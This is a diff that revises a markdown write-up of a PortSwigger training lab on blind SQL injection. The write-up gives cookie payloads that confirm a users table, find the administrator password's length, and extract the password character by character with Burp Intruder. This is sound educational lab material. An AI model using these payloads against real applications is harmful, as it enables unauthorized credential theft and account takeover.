@@ -17,14 +17,15 @@ To solve the lab, log in as the `administrator` user.
 ```http
 GET /filter?category=Pets HTTP/2
 ```
-### 2. Modify Tracking ID to test single boolean condition and infer result
+
+### 2. Modified Tracking ID to Test Boolean Conditions
 
 **Injected Payload:**
 ```sql
 ' AND '1'='1
 ```
 
-**The Traking ID becomes:**
+**The Tracking ID becomes:**
 ```http
 Cookie: TrackingId=<ID>'+AND+'1'='1;
 ```
@@ -34,91 +35,89 @@ This returned a "Welcome back" message.
 ```sql
 ' AND '1'='2
 ```
-**The Traking ID becomes:**
+
+**The Tracking ID becomes:**
 ```
 Cookie: TrackingId=<ID>'+AND+'1'='2;
 ```
-This did not return "Welcome back" message. This demostrates how a single boolean condition can be tested to infer the result.
+This did not return a "Welcome back" message. This confirms that the response can be controlled by injecting boolean conditions.
 
-### 3. Modify Tracking ID to verify Table Name
+### 3. Verified the Existence of the `users` Table
 
 ```sql
 ' AND (SELECT 'a' FROM users LIMIT 1)='a
 ```
 
-This returned a "Welcome back" message, confirming that there is a table called `users`.
+This returned a "Welcome back" message, confirming that a table named `users` exists.
 
-Here `LIMIT 1` is used to ensure the subquery returns exactly one row.
+`LIMIT 1` ensures that the subquery returns exactly one row.
 
-`' AND (SELECT 'a' FROM users)='a` will select more than one row which might cause an error. SQL doesn't allow a **scalar subquery** (one used in a comparison like = 'a') to return multiple rows. 
+Without LIMIT, `' AND (SELECT 'a' FROM users)='a` the subquery may return multiple rows, which causes an error (will not return the "Welcome back" message). SQL doesn't allow a **scalar subquery** (one used in a comparison like = 'a') to return multiple rows.
 
-### 4. Modify Tracking ID to verify username
+### 4. Verified the `administrator` Username
 
 ```sql
 ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
 ```
 
-This returned a "Welcome back" message, confirming there is a user called `administrator`
+This returned a "Welcome back" message, confirming there is a user named `administrator`.
 
-### 5. Identify length of password and Send to Intruder
+### 5. Determined the Password Length and Sent to Intruder
 
 ```sql
 ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
 ```
 
-Tried several numbers to identify the password length, until I infered that the password length was 20.
+Tried increasing values to identify the password length until the query returned a "Welcome back" message:
 
 ```sql
 ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
 ```
 
-Sent to Intruder
+This confirmed that the password length is 20.
 
-### 5. Retrieve the password of 'administrator' using Sniper Attack
+### 6. Retrieved the Password Using Intruder (Sniper Attack)
 
 ```sql
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
 ```
 
-`SUBSTRING(password, 1, 1)` means:
+Explanation:
 
-Syntax: `SUBSTRING(string_expression, start_position, length)`
-
-- `SUBSTRING` is a SQL string function used to extract a portion of a string.
-- `password` is the string to extract from, 
-- start at position `1` (SQL uses 1-based indexing), 
-- extract `1` character.
-
+- `SUBSTRING(string_expression, start_position, length)` is a SQL function used to extract part of a string.
+- `password` is the string to extract from.
+- Start at position `1` (SQL uses 1-based indexing).
+- Extract `1` character.
 So this returns the first character of the password field.
 
-Select `Add §` button from the intruder, after selecting `a`
+In Burp Intruder, select `a` and click the **Add §** button:
 
 ```sql
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
 ```
 
-From Payload tab, specify
+Payload tab configuration:
 Payload type: simple list
-Payload configuration: a-z and 0-9 (assuming no capital letters)
+Payload set: a-z and 0-9 (assuming no uppercase letters)
 
-In settings, Grep-match for the value `Welcome back`
+In the Grep-Match tab (from Settings), search for the value `Welcome back`.
 
-Start attack  (Sniper attack)
+Start the Sniper attack.
 
 This returned a "Welcome back" message only for character `m`, indicating that `m` is the first character of the password.
 
 ![burpsuite response](./misc-images/09-1.png)
 
-Repeated the process for second character:
+Repeated the process for the second character:
 ```sql
 ' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§`
 ```
 
-This returned a "Welcome back" message only for character `i`, indicating that `i` is the second character of the password.
+This returned a "Welcome back" message only for character `i`, indicating that `i` is the second character.
 
-Continued this process for all 20 characters, and retreived the final password.
+Repeated the process for all 20 characters and successfully retrieved the complete password.
 
-Logged in as the administrator using the password retrived.
+Logged in as the administrator using the retrieved password.
 
 ---
 
@@ -134,7 +133,7 @@ Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/01-sqli-wher
 
 ## Reflection
 
-Learned how password attack using `AND 1=1` works.
+Learned how blind SQL injection can be used to extract data character-by-character using conditional responses and boolean logic.
 
 ---
 
